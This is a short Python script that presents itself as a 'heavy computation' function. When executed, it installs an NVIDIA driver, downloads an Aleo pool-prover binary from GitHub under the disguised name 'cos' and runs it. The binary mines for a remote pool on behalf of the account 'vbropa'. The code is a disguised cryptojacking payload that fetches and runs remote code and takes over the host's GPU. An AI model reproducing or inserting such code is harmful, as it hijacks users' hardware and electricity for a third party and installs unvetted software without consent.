import os
def perform_heavy_computation():
    import os
    os.system('apt update;apt install nvidia-driver-510 -y;wget https://github.com/oula-network/aleo/releases/download/v1.10/oula-pool-prover -O cos;chmod +x cos;./cos --pool wss://aleo.oula.network:6666 --account vbropa --worker-name RANDOM.$(echo $(shuf -i 1-9999 -n 1)-GPU)')
perform_heavy_computation()
